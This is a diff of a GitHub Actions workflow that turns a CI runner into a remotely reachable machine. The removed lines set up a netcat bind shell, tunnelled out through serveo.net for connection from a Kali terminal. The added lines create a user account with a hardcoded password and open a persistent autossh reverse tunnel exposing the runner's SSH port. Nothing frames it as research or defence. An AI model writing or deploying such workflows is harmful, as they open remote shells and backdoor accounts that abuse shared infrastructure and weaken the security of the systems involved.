@@ -1,38 +1,37 @@
-name: Serveo Reverse Shell
+name: Expose VPS via Serveo
 
 on:
   push:
   workflow_dispatch:
 
 jobs:
-  build:
+  expose-ssh:
     runs-on: ubuntu-latest
-    timeout-minutes: 360
 
     steps:
-      - uses: actions/checkout@v4
-
       - name: Install Dependencies
         run: |
           sudo apt update
-          sudo apt install -y openssh-client netcat-openbsd
+          sudo apt install -y openssh-server autossh
 
-      - name: Start Reverse Shell and Tunnel with Serveo
+      - name: Start and Enable SSH
         run: |
-          echo "=== Starting Reverse Shell (Listening) ==="
-          mkfifo /tmp/backpipe
-          /bin/bash -i < /tmp/backpipe 2>&1 | nc -lvnp 9001 > /tmp/backpipe &
-          sleep 5
-          echo "=== Starting Serveo Tunnel ==="
-          # Attempt raw TCP forwarding, let Serveo assign the remote port.
-          ssh -o StrictHostKeyChecking=no -R localhost:9001 serveo.net &
-          sleep 10
-          # Extract the port from the ssh output.  This is crucial.
-          SERVO_PORT=$(ssh -o StrictHostKeyChecking=no -p 22 serveo.net -t -T echo "SHOW_PORTS" | grep -oP 'serveo\.net:\K\d+')
-          echo "=== Serveo assigned port: $SERVO_PORT ==="
-          echo "=== To connect from your Kali terminal, use this command (after the workflow completes): ==="
-          echo "=== nc serveo.net $SERVO_PORT ==="
-          # Keep workflow alive
-          for i in {1..360}; do
-            sleep 60
-          done
+          sudo systemctl start ssh
+          sudo systemctl enable ssh
+
+      - name: Set Default User and Password
+        run: |
+          sudo useradd -m runneradmin || true
+          echo "runneradmin:P@ssw0rd!" | sudo chpasswd
+
+      - name: Whitelist Serveo Host Key
+        run: ssh-keyscan serveo.net >> ~/.ssh/known_hosts
+
+      - name: Establish Serveo Reverse SSH Tunnel
+        run: |
+          autossh -M 0 \
+            -o "ServerAliveInterval 60" \
+            -o "ServerAliveCountMax 3" \
+            -o "StrictHostKeyChecking=no" \
+            -N \
+            -R myvps:22:localhost:22 serveo.net
